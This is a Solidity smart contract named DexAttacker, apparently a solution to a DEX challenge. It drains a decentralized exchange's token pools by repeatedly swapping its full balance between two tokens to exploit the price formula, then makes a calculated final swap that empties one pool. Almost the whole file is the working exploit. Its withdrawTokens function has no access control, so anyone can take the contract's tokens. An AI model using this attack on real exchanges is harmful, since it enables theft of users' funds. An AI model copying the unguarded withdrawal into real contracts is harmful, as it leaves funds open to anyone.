// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import {Dex} from "./Dex.sol";

/**
 * @title DexAttacker
 * @notice Contract to exploit the Dex price manipulation vulnerability
 * @dev The attack works by repeatedly swapping tokens back and forth,
 *      manipulating the price ratio until one token is completely drained
 */
contract DexAttacker {
    Dex public immutable dex;
    address public immutable token1;
    address public immutable token2;

    constructor(address _dex) {
        dex = Dex(_dex);
        token1 = dex.token1();
        token2 = dex.token2();
    }

    /**
     * @notice Execute the drain attack on the DEX
     * @dev Repeatedly swaps all tokens back and forth between token1 and token2
     *      until one of the DEX's token balances is completely drained
     */
    function drainDex() external {
        // Approve the DEX to spend our tokens
        dex.approve(address(dex), type(uint256).max);

        address tokenFrom = token1;
        address tokenTo = token2;

        // Continue swapping until one of the DEX's token balances reaches 0
        while (
            IERC20(token1).balanceOf(address(dex)) > 0 &&
            IERC20(token2).balanceOf(address(dex)) > 0
        ) {
            // Get the amount we want to swap (all our tokens of tokenFrom)
            uint256 amountToSwap = IERC20(tokenFrom).balanceOf(address(this));

            // Calculate how much tokenTo we would receive from this swap
            uint256 amountToReceive = dex.getSwapPrice(
                tokenFrom,
                tokenTo,
                amountToSwap
            );

            // Check if the DEX has enough tokenTo to fulfill the swap
            // If not, calculate the exact amount needed to drain the DEX completely
            if (IERC20(tokenTo).balanceOf(address(dex)) < amountToReceive) {
                amountToSwap = dex.getSwapPrice(
                    tokenTo,
                    tokenFrom,
                    IERC20(tokenTo).balanceOf(address(dex))
                );
            }

            // Execute the swap
            dex.swap(tokenFrom, tokenTo, amountToSwap);

            // Swap the direction for the next iteration
            (tokenFrom, tokenTo) = (tokenTo, tokenFrom);
        }
    }

    /**
     * @notice Get the balance of a specific token held by this contract
     * @param token The token address to check
     * @return The balance of the token
     */
    function getTokenBalance(address token) external view returns (uint256) {
        return IERC20(token).balanceOf(address(this));
    }

    /**
     * @notice Withdraw tokens from this contract to a specified address
     * @param token The token to withdraw
     * @param to The recipient address
     * @param amount The amount to withdraw
     */
    function withdrawTokens(
        address token,
        address to,
        uint256 amount
    ) external {
        require(IERC20(token).transfer(to, amount), "Transfer failed");
    }
}
